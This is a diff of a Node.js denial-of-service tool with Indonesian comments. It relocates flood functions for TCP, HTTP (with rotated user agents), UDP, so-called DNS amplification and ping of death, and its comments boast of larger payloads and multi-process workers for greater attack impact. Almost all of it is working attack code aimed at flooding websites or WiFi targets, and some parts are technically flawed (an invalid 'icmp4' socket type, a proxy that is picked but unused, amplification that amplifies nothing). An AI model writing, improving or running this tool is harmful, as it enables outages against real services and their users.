@@ -11,14 +11,84 @@ const crypto = require('crypto');
 const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').map(x => x.trim()).filter(Boolean);
 const userAgents = fs.readFileSync('user-agents.txt', 'utf-8').split('\n').map(x => x.trim()).filter(Boolean);
 
-// Daftar serangan
-const attacks = {
-    'tcp-flood': { name: 'TCP Flood', description: 'For WiFi and Website', handler: tcpFlood },
-    'http-flood': { name: 'HTTP Flood', description: 'For Website', handler: httpFlood },
-    'udp-flood': { name: 'UDP Flood', description: 'For WiFi', handler: udpFlood },
-    'dns-amplification': { name: 'DNS Amplification', description: 'For WiFi and Website', handler: dnsAmplification },
-    'ping-of-death': { name: 'Ping of Death', description: 'For WiFi and Website', handler: pingOfDeath }
-};
+// Fungsi untuk setiap serangan
+async function tcpFlood(target, port, duration) {
+    const endTime = Date.now() + duration * 1000;
+    let sentPackets = 0;
+    while (Date.now() < endTime) {
+        const client = new net.Socket();
+        client.connect(port, target, () => {
+            const payload = crypto.randomBytes(102400); // Payload lebih besar untuk dampak lebih besar
+            client.write(payload);
+            client.end();
+            sentPackets++;
+            progressCounter('TCP', sentPackets);
+        });
+        client.on('error', () => {});
+    }
+}
+
+async function httpFlood(target, port, duration) {
+    const endTime = Date.now() + duration * 1000;
+    let sentRequests = 0;
+    while (Date.now() < endTime) {
+        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
+        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
+        const options = {
+            hostname: target,
+            port,
+            path: '/',
+            headers: { 'User-Agent': userAgent }
+        };
+
+        const req = https.request(options, (res) => {
+            sentRequests++;
+            progressCounter('HTTP', sentRequests);
+        });
+
+        req.on('error', () => {});
+        req.end();
+    }
+}
+
+async function udpFlood(target, port, duration) {
+    const endTime = Date.now() + duration * 1000;
+    const message = crypto.randomBytes(102400); // Payload besar untuk dampak lebih besar
+    const client = dgram.createSocket('udp4');
+    let sentPackets = 0;
+    while (Date.now() < endTime) {
+        client.send(message, 0, message.length, port, target, () => {
+            sentPackets++;
+            progressCounter('UDP', sentPackets);
+        });
+    }
+}
+
+async function dnsAmplification(target, port, duration) {
+    const endTime = Date.now() + duration * 1000;
+    const message = crypto.randomBytes(1024); // Payload besar untuk lebih banyak amplifikasi
+    const client = dgram.createSocket('udp4');
+    let sentPackets = 0;
+    while (Date.now() < endTime) {
+        client.send(message, 0, message.length, port, target, () => {
+            sentPackets++;
+            progressCounter('DNS', sentPackets);
+        });
+    }
+}
+
+async function pingOfDeath(target, port, duration) {
+    const endTime = Date.now() + duration * 1000;
+    const message = crypto.randomBytes(102400); // Payload lebih besar untuk memberikan dampak lebih kuat
+    const client = dgram.createSocket('icmp4');
+    let sentPackets = 0;
+    while (Date.now() < endTime) {
+        client.send(message, 0, message.length, port, target, () => {
+            sentPackets++;
+            progressCounter('POD', sentPackets);
+        });
+    }
+}
 
 // Fungsi untuk membersihkan terminal dan menampilkan menu
 function displayMenu() {
@@ -42,6 +112,15 @@ function displayMenu() {
 function progressCounter(type, count) {
     process.stdout.write(`\r${type} packets sent: ${count}`);
 }
+
+// Daftar serangan
+const attacks = {
+    'tcp-flood': { name: 'TCP Flood', description: 'For WiFi and Website', handler: tcpFlood },
+    'http-flood': { name: 'HTTP Flood', description: 'For Website', handler: httpFlood },
+    'udp-flood': { name: 'UDP Flood', description: 'For WiFi', handler: udpFlood },
+    'dns-amplification': { name: 'DNS Amplification', description: 'For WiFi and Website', handler: dnsAmplification },
+    'ping-of-death': { name: 'Ping of Death', description: 'For WiFi and Website', handler: pingOfDeath }
+};
 
 // Multi-threading menggunakan cluster untuk meningkatkan dampak serangan
 if (cluster.isMaster) {
@@ -75,88 +154,5 @@ if (cluster.isMaster) {
         }
     } else {
         displayMenu();
-    }
-
-    // TCP Flood - Serangan yang sangat intensif
-    async function tcpFlood(target, port, duration) {
-        const endTime = Date.now() + duration * 1000;
-        let sentPackets = 0;
-        while (Date.now() < endTime) {
-            const client = new net.Socket();
-            client.connect(port, target, () => {
-                const payload = crypto.randomBytes(102400);  // Menggunakan buffer yang lebih besar untuk dampak lebih besar
-                client.write(payload);
-                client.end();
-                sentPackets++;
-                progressCounter('TCP', sentPackets);
-            });
-            client.on('error', () => {});
-        }
-    }
-
-    // HTTP Flood - Memaksimalkan Proksi dan Koneksi Simultan
-    async function httpFlood(target, port, duration) {
-        const endTime = Date.now() + duration * 1000;
-        let sentRequests = 0;
-        while (Date.now() < endTime) {
-            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
-            const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
-            const options = {
-                hostname: target,
-                port,
-                path: '/',
-                headers: { 'User-Agent': userAgent }
-            };
-
-            const req = https.request(options, (res) => {
-                sentRequests++;
-                progressCounter('HTTP', sentRequests);
-            });
-
-            req.on('error', () => {});
-            req.end();
-        }
-    }
-
-    // UDP Flood - Mengirimkan Payload dalam jumlah besar dengan kecepatan tinggi
-    async function udpFlood(target, port, duration) {
-        const endTime = Date.now() + duration * 1000;
-        const message = crypto.randomBytes(102400);  // Menggunakan payload lebih besar untuk dampak lebih besar
-        const client = dgram.createSocket('udp4');
-        let sentPackets = 0;
-        while (Date.now() < endTime) {
-            client.send(message, 0, message.length, port, target, () => {
-                sentPackets++;
-                progressCounter('UDP', sentPackets);
-            });
-        }
-    }
-
-    // DNS Amplification - Meningkatkan Serangan dengan Payload yang Lebih Besar
-    async function dnsAmplification(target, port, duration) {
-        const endTime = Date.now() + duration * 1000;
-        const message = crypto.randomBytes(1024);  // Payload besar untuk lebih banyak amplifikasi
-        const client = dgram.createSocket('udp4');
-        let sentPackets = 0;
-        while (Date.now() < endTime) {
-            client.send(message, 0, message.length, port, target, () => {
-                sentPackets++;
-                progressCounter('DNS', sentPackets);
-            });
-        }
-    }
-
-    // Ping of Death - Menambah Beban dengan Data Acak yang Lebih Besar
-    async function pingOfDeath(target, port, duration) {
-        const endTime = Date.now() + duration * 1000;
-        const message = crypto.randomBytes(102400);  // Payload lebih besar untuk memberikan dampak lebih kuat
-        const client = dgram.createSocket('icmp4');
-        let sentPackets = 0;
-        while (Date.now() < endTime) {
-            client.send(message, 0, message.length, port, target, () => {
-                sentPackets++;
-                progressCounter('POD', sentPackets);
-            });
-        }
     }
 }
